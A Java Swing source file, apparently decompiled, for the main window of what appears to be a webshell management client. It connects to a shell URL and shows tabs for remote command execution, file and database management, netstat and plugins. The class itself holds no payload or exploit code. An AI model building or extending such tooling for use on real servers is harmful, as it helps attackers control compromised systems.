package core.ui;
import core.ApplicationContext;
import core.EasyI18N;
import core.annotation.DisplayName;
import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.ShellBasicsInfo;
import core.ui.component.ShellCopyTab;
import core.ui.component.ShellDatabasePanel;
import core.ui.component.ShellExecCommandPanel;
import core.ui.component.ShellFileManager;
import core.ui.component.ShellNote;
import core.ui.component.dialog.GOptionPane;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import util.Log;
import util.functions;

public class ShellManage extends JFrame {
  private JTabbedPane tabbedPane;
  private ShellEntity shellEntity;
  private ShellExecCommandPanel shellExecCommandPanel;
  private LinkedHashMap<String, Plugin> pluginMap = new LinkedHashMap<>(); private ShellBasicsInfo shellBasicsInfo; private ShellFileManager shellFileManager; private ShellDatabasePanel shellDatabasePanel;
  private LinkedHashMap<String, JPanel> globalComponent = new LinkedHashMap<>();
  private ArrayList<JPanel> allViews = new ArrayList<>();
  private Payload payload;
  private ShellCopyTab shellCopyTab;
  private JLabel loadLabel = new JLabel("loading......");
  private static final HashMap<String, String> CN_HASH_MAP = new HashMap<>();
  
  static {
    CN_HASH_MAP.put("payload", "有效载荷");
    CN_HASH_MAP.put("secretKey", "密钥");
    CN_HASH_MAP.put("password", "密码");
    CN_HASH_MAP.put("cryption", "加密器");
    CN_HASH_MAP.put("PROXYHOST", "代理主机");
    CN_HASH_MAP.put("PROXYPORT", "代理端口");
    CN_HASH_MAP.put("CONNTIMEOUT", "连接超时");
    CN_HASH_MAP.put("READTIMEOUT", "读取超时");
    CN_HASH_MAP.put("PROXY", "代理类型");
    CN_HASH_MAP.put("REMARK", "备注");
    CN_HASH_MAP.put("ENCODING", "编码");
  }


  
  public ShellManage(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.tabbedPane = (JTabbedPane)new RTabbedPane();
    String titleString = String.format("Url:%s Payload:%s Cryption:%s openCache:%s useCache:%s", new Object[] { this.shellEntity.getUrl(), this.shellEntity.getPayload(), this.shellEntity.getCryption(), Boolean.valueOf(shellEntity.isUseCache() ? false : ApplicationContext.isOpenCache()), Boolean.valueOf(shellEntity.isUseCache()) });
    setTitle(titleString);
    boolean state = this.shellEntity.initShellOpertion();
    if (state) {
      init();
    } else {
      setTitle("初始化失败");
      GOptionPane.showMessageDialog(this, "初始化失败", "提示", 2);
      dispose();
    } 
  }

  
  private void init() {
    this.shellEntity.setFrame(this);
    this.payload = this.shellEntity.getPayloadModule();
    
    add(this.loadLabel);
    
    functions.setWindowSize(this, 1690, 680);
    setLocationRelativeTo(MainActivity.getFrame());
    setVisible(true);
    setDefaultCloseOperation(2);

    
    initComponent();
  }
  private void initComponent() {
    remove(this.loadLabel);
    add(this.tabbedPane);
    loadGlobalComponent();
    if (!this.shellEntity.isUseCache()) {
      loadPlugins();
    }
    loadView();
    this.shellCopyTab.scan();
  }
  private void loadView() {
    this.allViews.addAll(this.globalComponent.values());
    for (String key : this.globalComponent.keySet()) {
      JPanel panel = this.globalComponent.get(key);
      EasyI18N.installObject(panel);
      String name = panel.getClass().getSimpleName();
      DisplayName displayName = panel.getClass().<DisplayName>getAnnotation(DisplayName.class);
      if (displayName != null) {
        name = EasyI18N.getI18nString(displayName.DisplayName());
      }
      EasyI18N.installObject(panel);
      this.tabbedPane.addTab(name, this.globalComponent.get(key));
    } 
    for (String key : this.pluginMap.keySet()) {
      Plugin plugin = this.pluginMap.get(key);
      JPanel panel = plugin.getView();
      PluginAnnotation pluginAnnotation = plugin.getClass().<PluginAnnotation>getAnnotation(PluginAnnotation.class);
      if (panel != null) {
        EasyI18N.installObject(plugin);
        EasyI18N.installObject(panel);
        this.tabbedPane.addTab(pluginAnnotation.Name(), panel);
        this.allViews.add(panel);
      } 
    } 
  }
  public static String getCNName(String name) {
    for (String key : CN_HASH_MAP.keySet()) {
      if (key.toUpperCase().equals(name.toUpperCase())) {
        return CN_HASH_MAP.get(key);
      }
    } 
    return name;
  }
  private void loadGlobalComponent() {
    this.shellCopyTab = new ShellCopyTab(this.shellEntity);
    this.globalComponent.put("BasicsInfo", this.shellBasicsInfo = new ShellBasicsInfo(this.shellEntity));
    this.globalComponent.put("ExecCommand", this.shellExecCommandPanel = new ShellExecCommandPanel(this.shellEntity));
    this.globalComponent.put("FileManage", this.shellFileManager = new ShellFileManager(this.shellEntity));
    this.globalComponent.put("DatabaseManage", this.shellDatabasePanel = new ShellDatabasePanel(this.shellEntity));
    this.globalComponent.put("Note", new ShellNote(this.shellEntity));
    this.globalComponent.put("Netstat", new ShellNetstat(this.shellEntity));
    this.globalComponent.put("CopyTab", this.shellCopyTab);
  }
  private String getPluginName(Plugin p) {
    PluginAnnotation pluginAnnotation = p.getClass().<PluginAnnotation>getAnnotation(PluginAnnotation.class);
    return pluginAnnotation.Name();
  }
  
  public Plugin createPlugin(String pluginName) {
    try {
      Plugin plugin = this.pluginMap.get(pluginName);
      if (plugin != null) {
        plugin = (Plugin)plugin.getClass().newInstance();
        plugin.init(this.shellEntity);
        plugin.getView();
        return plugin;
      } 
    } catch (Exception e) {
      Log.error(e);
    } 
    return null;
  }
  public ShellFileManager getShellFileManager() {
    return this.shellFileManager;
  }
  
  private void loadPlugins() {
    Plugin[] plugins = ApplicationContext.getAllPlugin(this.shellEntity.getPayload());
    int i;
    for (i = 0; i < plugins.length; i++) {
      try {
        Plugin plugin = plugins[i];
        this.pluginMap.put(getPluginName(plugin), plugin);
      } catch (Exception e) {
        Log.error(e);
      } 
    } 
    for (i = 0; i < plugins.length; i++) {
      try {
        Plugin plugin = plugins[i];
        plugin.init(this.shellEntity);
      } catch (Exception e) {
        Log.error(e);
      } 
    } 
  }
  public Plugin getPlugin(String pluginName) {
    return this.pluginMap.get(pluginName);
  }
  
  public void dispose() {
    try {
      this.tabbedPane.disable();
      for (JPanel jPanel : this.allViews) {
        if (jPanel.isEnabled()) {
          jPanel.disable();
        }
      } 
    } catch (Exception e) {
      Log.error(e);
    } 
    close();
    if (this.payload != null && ApplicationContext.isOpenC("isAutoCloseShell")) {
      try {
        Log.log(String.format("CloseShellState: %s\tShellId: %s\tShellHash: %s", new Object[] { Boolean.valueOf(this.shellEntity.getPayloadModule().close()), this.shellEntity.getId(), Integer.valueOf(this.shellEntity.hashCode()) }), new Object[0]);
      } catch (Exception e) {
        Log.error(e);
      } 
    }
    super.dispose();
    System.gc();
  }
  
  public void close() {
    this.pluginMap.keySet().forEach(key -> {
          Plugin plugin = this.pluginMap.get(key);
          try {
            Method method = functions.getMethodByClass(plugin.getClass(), "closePlugin", null);
            if (method != null) {
              method.invoke(plugin, null);
            }
          } catch (Exception e) {
            Log.error(e);
          } 
        });
    this.globalComponent.keySet().forEach(key -> {
          JPanel plugin = this.globalComponent.get(key);
          try {
            Method method = functions.getMethodByClass(plugin.getClass(), "closePlugin", null);
            if (method != null) {
              method.invoke(plugin, null);
            }
          } catch (Exception e) {
            Log.error(e);
          } 
        });
    this.pluginMap.clear();
    this.globalComponent.clear();
  }
  
  public LinkedHashMap<String, Plugin> getPluginMap() {
    return this.pluginMap;
  }
  
  public LinkedHashMap<String, JPanel> getGlobalComponent() {
    return this.globalComponent;
  }
  
  public JTabbedPane getTabbedPane() {
    return this.tabbedPane;
  }
}
